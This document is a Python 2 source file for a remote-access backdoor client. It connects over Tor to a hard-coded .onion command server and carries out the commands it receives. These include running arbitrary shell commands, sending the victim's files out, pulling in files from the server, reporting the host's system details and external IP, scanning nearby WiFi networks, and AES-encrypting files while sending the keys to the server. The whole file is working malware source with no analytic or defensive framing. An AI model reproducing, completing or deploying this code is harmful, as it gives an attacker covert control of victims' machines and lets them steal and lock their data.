import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, urllib2, os.path, base64
from colored import fg, bg, attr
from subprocess import Popen, PIPE, STDOUT
from wifi import Cell, Scheme
from Crypto.Cipher import AES

class PKCS7Encoder():
    class InvalidBlockSizeError(Exception):
        """Raised for invalid block sizes"""
        pass

    def __init__(self, block_size=16):
        if block_size < 2 or block_size > 255:
            raise PKCS7Encoder.InvalidBlockSizeError('The block size must be ' \
                    'between 2 and 255, inclusive')
        self.block_size = block_size

    def encode(self, text):
        text_length = len(text)
        amount_to_pad = self.block_size - (text_length % self.block_size)
        if amount_to_pad == 0:
            amount_to_pad = self.block_size
        pad = chr(amount_to_pad)
        return text + pad * amount_to_pad

    def decode(self, text):
        pad = ord(text[-1])
        return text[:-pad]

encoder = PKCS7Encoder()
host = 'hcjczulezpxxfw2n.onion'
#host = '127.0.0.1'
cType = "client000-crypto"

# sysinfo
uname = platform.uname()[0:3]

try:
    myIP = urllib2.urlopen("http://myexternalip.com/raw").read()[0:-1]
except:
    myIP = "Error! Can't check IP!"
def RecvData():
    temp = ssl_sock.read()
    return temp

def ScanWIFI(card):
    try:
        wifiCell = Cell.all(card)
    except:
        wifiCell = Cell.all('wlp8s0')
        SendData("Something went wrong... using wlp8s0")
    for i in range(0,len(wifiCell)):
        SendData(str(wifiCell[i]) + " is encrypted: "+ str(wifiCell[i].encrypted) + "= " + str(wifiCell[i].encryption_type) + " | address: " +str(wifiCell[i].address))
    SendData("ScanWIFI-finished")

def RecvData():
    temp = ssl_sock.read()
    return temp

def DKey(primitiveKey, salt):
    dk = hashlib.pbkdf2_hmac('sha256', primitiveKey, salt, 500000)
    return dk

def Encrypt(fileToProtect, cipher, key, IV):
    try:
        with open(fileToProtect, 'rb') as inFile, open(fileToProtect + '.enc', 'wa') as outFile:
            clearData = inFile.read()
            cryptData = cipher.encrypt(encoder.encode(clearData))
            outFile.write(cryptData)
        inFile.close()
        outFile.close()
        SendData('############################ Encrption Success')
        SendData('--> original file: ' + str(fileToProtect))
        SendData('--> protected file: ' + str(fileToProtect) + '.enc')
        SendData('HEX: ' + str(CheckHash(fileToProtect + '.enc', key, IV)))
        SendData('HashKEY: ' + base64.b64encode(DKey(key, IV)))
        SendData('----------------------------------------------')
        SendData('END')
    except:
        SendData('############################ Encrption Failed')
        if os.path.isfile(fileToProtect + '.enc') == True:
            os.remove(fileToProtect + '.enc')
            SendData('Files deleted!')
            SendData('END')
        else:
            SendData('--> no file encrypted')
            SendData('----------------------------------------------')
            SendData('END')

def Decrypt(fileProtected, cipher, digest, key, IV):
    fileToDeProtect = fileProtected.split('.')[0] + "." + fileProtected.split('.')[1] + ".dec"
    try:
        if hmac.compare_digest(CheckHash(fileProtected, key, IV), digest) == True:
            with open(fileProtected, 'rb') as inFile, open(fileToDeProtect, 'wa') as outFile:
                cryptData = inFile.read()
                clearData = cipher.decrypt(cryptData)
                cleanData = encoder.decode(clearData)
                outFile.write(cleanData)
            inFile.close()
            outFile.close()
        else:
            raise ValueError ('Data Not Secure')
        SendData('############################ Decrption Success')
        SendData('--> original file: ' + fileProtected)
        SendData('--> protected file: ' + fileToDeProtect)
        SendData('HashKEY: ' + base64.b64encode(DKey(key, IV)))
        SendData('HASH: Verified')
        SendData('----------------------------------------------')
        SendData('END')
    except:
        SendData('############################ Decrption Failed')
        SendData('Removing files!')
        if os.path.isfile(fileProtected ) == True:
            os.remove(fileProtected)
            SendData('File protected deleted')
        if os.path.isfile(fileToDeProtect) == True:
            os.remove(fileToDeProtect)
            SendData('File to de-protect deleted')
        else:
            SendData('--> no file here')
            SendData('----------------------------------------------')
            SendData('END')

def CheckHash(fileName, key, IV):
    hasher = hmac.new(DKey(key, IV),'',hashlib.sha256)
    with open(fileName, 'rb') as inFile:
        buf = inFile.read(2048)
        hasher.update(buf)
    return base64.b64encode(hasher.digest())

def SendData(inText):
    ssl_sock.write(inText)

def EXEC(cmd):
    p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
    return p.stdout.read()

def UploadFILE(fileName):
    fileUP = open(fileName, 'rb')
    SendData(str(os.path.getsize(fileName)))
    while 1:
        tempData = fileUP.read()
        if tempData == '':
            break
        else:
            SendData(tempData)
    fileUP.close()
    SendData("CUF") #Client Upload Finished

def DownloadFILE(fileName):
    fileDOWN = open(fileName, 'wa')
    while 1:
        temp = RecvData()
        if temp == 'SUF':
            break
        else:
            fileDOWN.write(temp)
    fileDOWN.close()
    SendData("CDF")


sock = socks.socksocket()
sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
sock.connect((host,5555))

ssl_sock = ssl.wrap_socket(sock,
                           ca_certs="certificate.pem",
                           cert_reqs=ssl.CERT_REQUIRED)

print repr(ssl_sock.getpeername())
print ssl_sock.cipher()
infosServer = ssl_sock.getpeercert()
#ssl.match_hostname(infosServer,host)
SendData(cType)

while 1:
    inText = RecvData()
    if inText.startswith("download"):
        UploadFILE(inText.split(" ")[1])
        chunk = RecvData()
    elif inText == "info":
        SendData(str(uname))
        SendData('ip:'+myIP)
        SendData("end-info")
    elif inText.startswith("upload"):
        DownloadFILE(inText.split(" ")[1])
    elif inText == "terminate":
        ssl_sock.close()
        sys.exit(0)
    elif inText.startswith("ScanWIFI"):
        ScanWIFI(inText.split(':')[1])
    elif inText.startswith('protect'):
        if inText.split(':')[1] == 'enc':
            fileToProtect = inText.split(':')[2]
            IV = os.urandom(16)
            key = os.urandom(32)
            SendData('IV: ' + base64.b64encode(IV))
            SendData('key: '+ base64.b64encode(key))
            cipher = AES.new(key, AES.MODE_CBC, IV)
            Encrypt(fileToProtect, cipher, key, IV)
        elif inText.split(':')[1] == 'dec':
            fileToDeProtect = inText.split(':')[2]
            IV = base64.b64decode(inText.split(':')[3])
            key = base64.b64decode(inText.split(':')[4])
            HEX = inText.split(':')[5]
            cipher = AES.new(key, AES.MODE_CBC, IV)
            Decrypt(fileToDeProtect, cipher, HEX, key, IV)
    elif inText.startswith("exec"):
        outEXEC = EXEC(inText.split(":")[1])
        SendData(outEXEC)
    else:
        print '[inText] ' + inText
        ssl_sock.write(inText)
